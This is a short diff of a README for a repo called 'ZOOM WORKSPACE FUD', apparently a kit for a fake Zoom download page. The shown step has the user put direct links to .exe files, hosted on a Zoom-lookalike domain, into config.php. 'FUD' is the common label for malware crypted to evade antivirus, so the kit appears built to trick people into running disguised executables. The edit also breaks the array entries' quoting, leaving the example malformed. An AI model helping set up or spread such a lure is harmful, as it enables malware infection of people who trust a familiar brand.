@@ -28,8 +28,8 @@ Welcome to the **ZOOM WORKSPACE FUD** repo! This project allows you to easily se
    - Add your **direct file links** to `config.php`.
      - Example:
        ```
-    "file1" => "https://zoomgo.us/files/sample1.exe"
-    "file2" => "https://zoomgo.us/files/sample2.exe"
+    file1" => "https://zoomgo.us/files/sample1.exe
+    file2" => "https://zoomgo.us/files/sample2.exe
        ```
 
 ---
